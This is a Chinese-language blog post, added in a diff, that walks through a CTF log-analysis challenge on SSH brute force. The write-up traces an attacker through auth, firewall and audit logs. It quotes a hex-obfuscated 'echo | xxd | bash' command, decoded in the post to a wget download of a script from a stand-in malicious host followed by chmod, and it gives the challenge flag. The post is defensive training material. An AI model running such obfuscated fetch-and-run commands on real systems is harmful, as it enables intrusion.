@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSH 暴力破解与日志分析</title>
+<meta name="description" content="认证日志 + 防火墙日志 + 审计日志三源关联：定位真实攻击 IP、识别混淆执行的恶意命令、还原下载的脚本与授予的执行权限。">
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <a class="logo" href="../index.html">pressure-J<span>.</span></a>
+    <nav>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">文章</a>
+      <a href="https://github.com/pressure-J">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="post-head">
+    <h1>SSH 暴力破解与日志分析</h1>
+    <div class="meta"><span class="cat">应急响应</span>2026-07-08</div>
+  </div>
+  <div class="content">
+<h1 id="writeup">日志分析 WriteUp</h1>
+<h2 id="_1">题目信息</h2>
+<p>2026年某日凌晨，运维人员发现一台核心服务器 CPU 使用率异常升高。检查系统日志发现大量 SSH 失败记录，且有多条来自不同 IP 的成功登录。进一步查看审计日志，发现其中某次用户登录执行了可疑命令。分析附件中的 combined.log，其中包含认证日志、防火墙日志和审计日志。攻击者成功登录后，使用了混淆手法执行恶意命令。请找出攻击者的真实 IP、下载的恶意脚本文件名以及赋予的执行权限。</p>
+<p><strong>flag 格式</strong>：<code>flag{IP_脚本名_权限}</code>（例如 <code>flag{192.168.5.231_test.sh_644}</code>）</p>
+<hr />
+<h2 id="_2">日志文件结构</h2>
+<p><code>combined.log</code> 包含三种类型的日志：</p>
+<table>
+<thead>
+<tr>
+<th>日志类型</th>
+<th>标识</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>认证日志</strong></td>
+<td><code>sshd</code></td>
+<td>SSH 登录成功/失败记录</td>
+</tr>
+<tr>
+<td><strong>防火墙日志</strong></td>
+<td><code>kernel: [UFW ALLOW]</code></td>
+<td>iptables/UFW 放行记录</td>
+</tr>
+<tr>
+<td><strong>审计日志</strong></td>
+<td><code>audit</code></td>
+<td>系统命令执行记录</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_3">解题步骤</h2>
+<h3 id="1-ssh">步骤 1：分析 SSH 暴破阶段</h3>
+<p>日志文件前半部分（约 15000 行）为 SSH 暴破记录，大量不同外网 IP 尝试暴力破解 root 账户：</p>
+<div class="highlight"><pre><span></span><code>May 22 02:00:00 host sshd[10010]: Failed password for root from 185.130.5.253 port 42650 ssh2
+May 22 02:00:00 host sshd[10014]: Failed password for root from 134.209.42.17 port 44293 ssh2
+May 22 02:00:00 host sshd[10039]: Failed password for root from 46.101.88.33 port 48545 ssh2
+...
+</code></pre></div>
+
+<p><strong>暴破 IP 列表</strong>：185.130.5.253、134.209.42.17、46.101.88.33、159.89.180.24、45.33.22.11、193.106.30.99、103.56.12.87、162.243.12.5、5.188.86.123、89.248.165.99、198.98.55.120、185.165.29.111</p>
+<h3 id="2">步骤 2：定位防火墙日志</h3>
+<p>在约第 15002 行发现唯一的 UFW 防火墙放行记录：</p>
+<div class="highlight"><pre><span></span><code>May 22 02:01:03 host kernel: [UFW ALLOW] IN=eth0 OUT= MAC= SRC=203.0.113.88 DST=10.0.0.10 PROTO=TCP SPT=52341 DPT=22
+</code></pre></div>
+
+<p>这说明外网 IP <code>203.0.113.88</code> 通过防火墙连接到了服务器的 22 端口。</p>
+<h3 id="3">步骤 3：定位成功登录记录</h3>
+<p>搜索 <code>Accepted password</code>，发现大量来自不同 IP 的成功登录：</p>
+<div class="highlight"><pre><span></span><code>May 22 02:01:06 host sshd[42538]: Accepted password for admin from 193.106.30.99 port 46118 ssh2
+May 22 02:01:16 host sshd[23450]: Accepted password for admin from 192.168.1.37 port 40216 ssh2
+May 22 02:01:40 host sshd[21432]: Accepted password for admin from 10.0.0.18 port 49383 ssh2
+May 22 02:01:51 host sshd[48121]: Accepted password for admin from 203.0.113.88 port 52341 ssh2
+May 22 02:02:03 host sshd[45111]: Accepted password for admin from 10.0.0.27 port 56862 ssh2
+...
+</code></pre></div>
+
+<h3 id="4">步骤 4：审计日志中发现混淆命令</h3>
+<p>在审计日志中，第 15027-15028 行发现异常命令执行（<strong>注意时间 <code>02:02:05</code></strong>）：</p>
+<div class="highlight"><pre><span></span><code>May 22 02:02:05 host audit[12349]: type=EXECVE msg=audit(...): a0="echo" a1="7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368"
+May 22 02:02:05 host audit[12350]: type=EXECVE msg=audit(...): a0="sh" a1="-c" a2="echo '7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368' | xxd -p -r | bash"
+</code></pre></div>
+
+<p>攻击者使用的混淆手法：
+1. 将恶意命令转换成 <strong>hex 编码</strong>
+2. 使用 <code>echo 'hex' | xxd -p -r | bash</code> 的方式解码并执行
+3. 避开了 bash_history 中直接记录敏感命令</p>
+<h3 id="5-hex">步骤 5：解码 hex 还原命令</h3>
+<p>hex 字符串：</p>
+<div class="highlight"><pre><span></span><code>7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368
+</code></pre></div>
+
+<p>解码后得到：</p>
+<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>http://malicious.com/update.sh<span class="w"> </span>-O<span class="w"> </span>/tmp/update.sh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/tmp/update.sh
+</code></pre></div>
+
+<h3 id="6">步骤 6：提取关键信息</h3>
+<h4 id="_4">恶意脚本文件名</h4>
+<p>从 <code>wget http://malicious.com/update.sh -O /tmp/update.sh</code> 可知：</p>
+<ul>
+<li><strong>下载 URL</strong>：<code>http://malicious.com/update.sh</code></li>
+<li><strong>保存路径</strong>：<code>/tmp/update.sh</code></li>
+<li><strong>脚本文件名</strong>：<strong><code>update.sh</code></strong></li>
+</ul>
+<h4 id="_5">赋予的执行权限</h4>
+<p>从 <code>chmod 755 /tmp/update.sh</code> 可知：</p>
+<ul>
+<li><strong>权限值</strong>：<strong><code>755</code></strong>（即 <code>rwxr-xr-x</code>，所有者可读写执行，组和其他用户可读执行）</li>
+</ul>
+<h4 id="ip">攻击者真实 IP</h4>
+<p>需要结合防火墙日志和 SSH 登录日志综合判定：</p>
+<ol>
+<li><strong>UFW 防火墙日志</strong>是唯一记录了外网真实 IP 的来源：</li>
+</ol>
+<div class="highlight"><pre><span></span><code>May 22 02:01:03 host kernel: [UFW ALLOW] IN=eth0 OUT= MAC= SRC=203.0.113.88 DST=10.0.0.10 PROTO=TCP SPT=52341 DPT=22
+</code></pre></div>
+
+<ol start="2">
+<li>端口号 <code>52341</code> 与 SSH 成功登录记录完全匹配：</li>
+</ol>
+<div class="highlight"><pre><span></span><code>May 22 02:01:51 host sshd[48121]: Accepted password for admin from 203.0.113.88 port 52341 ssh2
+</code></pre></div>
+
+<ol start="3">
+<li>时间线分析：</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>时间</th>
+<th>事件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>02:01:03</code></td>
+<td>UFW ALLOW <code>203.0.113.88 → 10.0.0.10</code></td>
+<td>外网连接通过防火墙</td>
+</tr>
+<tr>
+<td><code>02:01:51</code></td>
+<td>SSH 成功登录 <code>203.0.113.88</code></td>
+<td>攻击者建立会话</td>
+</tr>
+<tr>
+<td><code>02:02:03</code></td>
+<td>SSH 成功登录 <code>10.0.0.27</code></td>
+<td>内部 IP 登录（正常运维）</td>
+</tr>
+<tr>
+<td><code>02:02:05</code></td>
+<td><code>audit[12347: id]</code> + <code>audit[12348: exit]</code></td>
+<td>内部运维人员查看身份后退出</td>
+</tr>
+<tr>
+<td><strong><code>02:02:05</code></strong></td>
+<td><strong><code>audit[12349-12351]</code>: 恶意命令执行</strong></td>
+<td><strong>攻击者通过 <code>203.0.113.88</code> 会话执行恶意命令</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>攻击者真实 IP</strong>：<strong><code>203.0.113.88</code></strong></p>
+<blockquote>
+<p>关键判断依据：<code>10.0.0.27</code> 执行了 <code>id</code> 和 <code>exit</code> 后退出，是正常的运维操作。而恶意命令紧随其后，来自先期已建立的 <code>203.0.113.88</code> 会话。UFW 日志中的 <code>SRC=203.0.113.88</code> 是攻击者未经 NAT 转换的<strong>真实外网 IP</strong>。</p>
+</blockquote>
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="highlight"><pre><span></span><code>flag{203.0.113.88_update.sh_755}
+</code></pre></div>
+
+<hr />
+<h2 id="_6">攻击还原总结</h2>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>信息收集</strong></td>
+<td>外网多个 IP 对服务器 22 端口进行 SSH 暴破</td>
+</tr>
+<tr>
+<td><strong>突破边界</strong></td>
+<td>攻击者从 <code>203.0.113.88</code> 通过 UFW 防火墙进入服务器</td>
+</tr>
+<tr>
+<td><strong>成功登录</strong></td>
+<td><code>02:01:51</code> 以 <code>admin</code> 账户 SSH 登录服务器</td>
+</tr>
+<tr>
+<td><strong>命令混淆</strong></td>
+<td><code>02:02:05</code> 使用 <code>echo hex | xxd -p -r | bash</code> 手法执行恶意命令</td>
+</tr>
+<tr>
+<td><strong>下载脚本</strong></td>
+<td><code>wget http://malicious.com/update.sh -O /tmp/update.sh</code></td>
+</tr>
+<tr>
+<td><strong>赋予权限</strong></td>
+<td><code>chmod 755 /tmp/update.sh</code>，赋予脚本可执行权限</td>
+</tr>
+<tr>
+<td><strong>后续操作</strong></td>
+<td><code>whoami</code> 确认当前身份（与审计日志 12351 对应）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_7">快速查找方法（命令行）</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 搜索成功登录记录</span>
+Select-String<span class="w"> </span><span class="s2">"Accepted password"</span><span class="w"> </span>combined.log
+
+<span class="c1"># 2. 搜索审计日志中的命令执行</span>
+Select-String<span class="w"> </span><span class="s2">"audit"</span><span class="w"> </span>combined.log
+
+<span class="c1"># 3. 搜索涉及 xxd / wget 的可疑行</span>
+Select-String<span class="w"> </span><span class="s2">"xxd|wget|chmod"</span><span class="w"> </span>combined.log
+
+<span class="c1"># 4. 解码 hex</span>
+<span class="o">[</span>System.Text.Encoding<span class="o">]</span>::UTF8.GetString<span class="o">([</span>byte<span class="o">[]]</span>@<span class="o">(</span>0x77,0x67,0x65,0x74,...<span class="o">))</span>
+</code></pre></div>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div>&copy; 2026 pressure-J · 网络安全方向</div>
+    <div><a href="https://github.com/pressure-J">GitHub</a></div>
+  </div>
+</footer>
+</body>
+</html>
